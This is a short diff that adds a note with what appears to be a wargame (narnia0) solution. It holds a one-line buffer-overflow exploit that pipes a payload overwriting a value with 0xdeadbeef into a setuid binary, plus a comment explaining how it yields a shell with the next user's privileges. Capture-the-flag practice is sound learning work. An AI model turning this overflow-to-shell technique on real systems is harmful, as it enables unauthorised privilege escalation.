@@ -1,0 +1,3 @@
+(python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; cat -) | /narnia/narnia0 
+
+** using a vuln in scanf to create a buffer overflow -> creating a subshell using "(; cat -)" -> to open a shell with premitions of the next user 
